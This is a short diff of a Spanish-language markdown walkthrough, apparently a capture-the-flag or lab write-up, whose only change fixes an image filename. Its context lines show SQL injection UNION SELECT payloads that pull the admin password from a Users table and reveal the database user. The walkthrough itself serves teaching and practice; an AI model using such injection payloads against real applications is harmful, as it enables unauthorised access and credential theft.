@@ -158,7 +158,7 @@ xd') union select 1,2,Password,4 from Users where Username="admin"-- -
 xd') union select 1,2,user(),4 from INFORMATION_SCHEMA.SCHEMATA-- -
 ```
 
-![usuario](imgs/usuario.pn)
+![usuario](imgs/usuario.png)
 
 Estamos como `chattr_dbUser@localhost`
 
